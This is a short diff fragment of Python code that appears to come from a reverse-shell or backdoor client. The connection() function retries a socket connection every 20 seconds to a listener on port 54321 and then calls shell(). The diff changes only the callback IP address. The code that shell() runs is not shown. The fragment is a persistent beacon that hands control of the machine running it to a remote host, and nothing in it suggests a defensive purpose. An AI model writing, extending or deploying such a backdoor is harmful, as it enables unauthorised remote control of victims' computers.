@@ -53,7 +53,7 @@ def connection():
 	while True:
 		time.sleep(20)
 		try:
-			sock.connect(("192.168.126.138",54321))
+			sock.connect(("192.168.1.8",54321))
 			shell()
 		except:
 			connection()
